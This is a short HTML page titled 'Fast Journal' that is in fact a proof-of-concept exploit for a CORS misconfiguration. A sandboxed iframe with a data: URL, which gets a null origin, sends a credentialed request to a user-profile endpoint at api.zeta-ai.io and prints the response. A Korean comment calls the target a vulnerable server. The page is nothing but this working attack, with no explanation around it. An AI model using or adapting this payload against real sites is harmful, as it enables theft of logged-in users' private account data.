<!DOCTYPE html>
<html>
<head>
    <title>Fast Journal</title>
    <meta charset="utf-8">
    <link rel="stylesheet" href="css/main.css?dt=202502130523">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/concrete.css/3.0.0/concrete.min.css">
</head>
<body>
    <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
    <script>
        var xhr = new XMLHttpRequest();
        xhr.onload = reqListener;
        xhr.open('get', 'https://api.zeta-ai.io/v1/users/me', true); // 취약한 서버로 ajax 요청을 보냄
        xhr.withCredentials = true;
        xhr.send();
        function reqListener() {
            console.log(this.responseText);
        };
    </script>"> 
    </iframe>
</body>
</html>
